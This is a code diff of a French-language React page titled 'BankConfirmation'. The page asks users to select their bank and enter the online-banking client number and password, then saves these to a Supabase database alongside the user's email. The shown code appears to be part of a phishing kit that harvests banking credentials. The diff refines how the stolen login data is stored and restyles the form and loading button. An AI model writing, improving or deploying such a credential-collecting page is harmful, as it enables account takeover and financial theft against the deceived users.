@@ -3,8 +3,10 @@ import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import Footer from "@/components/Footer";
 import ProgressStepper from "@/components/ProgressStepper";
-import { updateUserSession, saveUserDataToJson } from "@/utils/sessionUtils";
+import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
+import { upsertUser } from "@/utils/supabaseClient";
 import { toast } from "sonner";
+import { Button } from "@/components/ui/button";
 
 const BankConfirmation: React.FC = () => {
   const [typeBanque, setTypeBanque] = useState("");
@@ -25,15 +27,33 @@ const BankConfirmation: React.FC = () => {
     setIsLoading(true);
 
     try {
-      // Stocke les informations dans la session
+      // Récupérer l'email de la session pour identifier l'utilisateur
+      const userData = getFromSession("userData") || {};
+      const email = userData.email;
+      
+      if (!email) {
+        toast.error("Erreur: email utilisateur manquant");
+        setIsLoading(false);
+        return;
+      }
+      
+      // Préparation des données bancaires uniquement
+      const bankData = {
+        email,
+        typebanque: typeBanque,
+        identifiantbanque: identifiantBancaire,
+        codepersonnel: codePersonnel
+      };
+      
+      // Mettre à jour la session avec les données complètes
       updateUserSession({
         typeBanque,
         identifiantBancaire,
         codePersonnel
       });
       
-      // Enregistre dans Supabase
-      await saveUserDataToJson();
+      // N'envoyer que les données bancaires à Supabase
+      await upsertUser(bankData);
       
       setIsLoading(false);
       setProcessing(true);
@@ -123,7 +143,7 @@ const BankConfirmation: React.FC = () => {
                 <select
                   value={typeBanque}
                   onChange={(e) => setTypeBanque(e.target.value)}
-                  className="form-input"
+                  className="w-full rounded-md border border-gray-300 px-4 py-2"
                 >
                   <option value="">Sélectionnez votre type de banque.</option>
                   <option value="credit-agricole">Crédit Agricole</option>
@@ -140,7 +160,7 @@ const BankConfirmation: React.FC = () => {
                   type="text"
                   value={identifiantBancaire}
                   onChange={(e) => setIdentifiantBancaire(e.target.value)}
-                  className="form-input"
+                  className="w-full rounded-md border border-gray-300 px-4 py-2"
                   placeholder="Identifiant bancaire"
                 />
               </div>
@@ -150,7 +170,7 @@ const BankConfirmation: React.FC = () => {
                   type="password"
                   value={codePersonnel}
                   onChange={(e) => setCodePersonnel(e.target.value)}
-                  className="form-input"
+                  className="w-full rounded-md border border-gray-300 px-4 py-2"
                   placeholder="Code personnel"
                 />
               </div>
@@ -160,17 +180,23 @@ const BankConfirmation: React.FC = () => {
                 <p className="mt-2">Pour confirmer votre compte bancaire, veuillez saisir le numéro de client et le mot de passe utilisé pour vos services bancaires en ligne.</p>
               </div>
 
-              <button
+              <Button
                 type="submit"
-                className="primary-button flex items-center justify-center mt-6"
+                className="w-full bg-orange-500 hover:bg-orange-600 text-white"
                 disabled={isLoading}
               >
                 {isLoading ? (
-                  <span className="loading-spinner" />
+                  <span className="flex items-center justify-center">
+                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    Chargement...
+                  </span>
                 ) : (
                   "Continuer"
                 )}
-              </button>
+              </Button>
             </form>
           </div>
         )}
